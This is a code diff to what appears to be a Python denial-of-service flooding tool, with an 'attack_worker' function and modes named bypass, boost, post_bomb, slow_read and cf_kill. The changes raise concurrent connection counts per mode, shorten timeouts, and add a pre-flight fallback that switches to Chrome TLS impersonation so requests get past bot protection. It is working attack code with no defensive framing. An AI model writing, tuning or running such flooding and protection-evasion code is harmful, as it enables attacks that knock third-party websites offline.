@@ -1294,7 +1294,7 @@ async def attack_worker(session, url_obj, host, tid):
             start_ts = time.time()
 
             if use_curl_cffi:
-                req_kwargs = {"headers": headers, "timeout": 8, "allow_redirects": True}
+                req_kwargs = {"headers": headers, "timeout": 5, "allow_redirects": True}
                 if method in ("POST", "PUT", "PATCH") and post_data:
                     req_kwargs["data"] = post_data
                 req_func = getattr(session, method.lower())
@@ -1596,7 +1596,8 @@ def main():
     interactive = True
     cli = getattr(sys.modules[__name__], "command_line_args", None)
     if cli:
-        interactive = not cli.target
+        interactive = not any([cli.bypass, cli.boost, cli.multi_method,
+                               cli.post_bomb, cli.slow_read, cli.adaptive, cli.cf_kill])
 
     try:
         show_banner()
@@ -1757,7 +1758,12 @@ def main():
     if cli and cli.conns and cli.conns > 0:
         conns = cli.conns
     elif use_curl_cffi:
-        conns = 15
+        if boost_mode:
+            conns = 50
+        elif bypass_active or cf_kill:
+            conns = 30
+        else:
+            conns = 20
     elif cf_kill and direct_origin and origin_ips:
         conns = 120 // session_count
     elif boost_mode:
@@ -1774,32 +1780,82 @@ def main():
 
     safe_print("< / > Pre-flight test...")
     p_target = f"{scheme}://{parsed.netloc}/"
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        async def preflight():
-            p_headers = build_headers(host, None, "GET", port=port)
-            if use_curl_cffi:
-                async with CurlAsyncSession(impersonate="chrome") as s:
-                    r = await s.get(p_target, headers=p_headers, timeout=10, allow_redirects=True)
-                    return r.status_code
-            else:
+    p_code = None
+    
+    # Try aiohttp first (faster), fall back to curl_cffi if it fails
+    if use_curl_cffi and not (cli and cli.no_curl):
+        try:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            async def preflight_aiohttp():
+                p_headers = build_headers(host, None, "GET", port=port)
                 ssl_ctx = _browser_ssl_context() if scheme == "https" else False
                 connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=1, force_close=True)
                 async with aiohttp.ClientSession(connector=connector) as s:
                     async with s.get(p_target, headers=p_headers,
-                                     timeout=aiohttp.ClientTimeout(total=10),
+                                     timeout=aiohttp.ClientTimeout(total=8),
                                      allow_redirects=True) as resp:
                         await resp.read()
                         return resp.status
-        p_code = loop.run_until_complete(preflight())
-        loop.close()
-        safe_print(f"    Pre-flight OK — status {p_code}")
-    except Exception as e:
-        err_msg = f"Pre-flight FAIL: {type(e).__name__}: {str(e)[:120]} | target={p_target}"
-        log_error(err_msg)
-        safe_print(f"    Pre-flight FAIL — {type(e).__name__}: {str(e)[:80]}")
-        safe_print("    Continuing anyway...")
+            p_code = loop.run_until_complete(preflight_aiohttp())
+            loop.close()
+        except Exception as e:
+            safe_print(f"    aiohttp pre-flight FAIL — {type(e).__name__}: {str(e)[:60]}")
+            safe_print("    Switching to curl_cffi (browser TLS impersonation)...")
+            use_curl_cffi = True
+            p_code = None
+    
+    if p_code is None:
+        try:
+            loop = asyncio.new_event_loop()
+            asyncio.set_event_loop(loop)
+            async def preflight():
+                p_headers = build_headers(host, None, "GET", port=port)
+                if use_curl_cffi:
+                    async with CurlAsyncSession(impersonate="chrome") as s:
+                        r = await s.get(p_target, headers=p_headers, timeout=10, allow_redirects=True)
+                        return r.status_code
+                else:
+                    ssl_ctx = _browser_ssl_context() if scheme == "https" else False
+                    connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=1, force_close=True)
+                    async with aiohttp.ClientSession(connector=connector) as s:
+                        async with s.get(p_target, headers=p_headers,
+                                         timeout=aiohttp.ClientTimeout(total=10),
+                                         allow_redirects=True) as resp:
+                            await resp.read()
+                            return resp.status
+            p_code = loop.run_until_complete(preflight())
+            loop.close()
+            safe_print(f"    Pre-flight OK — status {p_code}")
+        except Exception as e:
+            err_msg = f"Pre-flight FAIL: {type(e).__name__}: {str(e)[:120]} | target={p_target}"
+            log_error(err_msg)
+            safe_print(f"    Pre-flight FAIL — {type(e).__name__}: {str(e)[:80]}")
+            safe_print("    Continuing anyway...")
+    else:
+        safe_print(f"    Pre-flight OK — status {p_code} (aiohttp mode)")
+        use_curl_cffi = False
+
+    # Recalculate conns based on final mode
+    if not (cli and cli.conns and cli.conns > 0):
+        if use_curl_cffi:
+            if boost_mode:
+                conns = 50
+            elif bypass_active or cf_kill:
+                conns = 30
+            else:
+                conns = 20
+        else:
+            if cf_kill and direct_origin and origin_ips:
+                conns = 120 // session_count
+            elif boost_mode:
+                conns = 150 // session_count
+            elif bypass_active or cf_kill:
+                conns = 90 // session_count
+            else:
+                conns = 50
+        conns = max(1, conns)
+        total_conns = conns * session_count
 
     print_live()
 
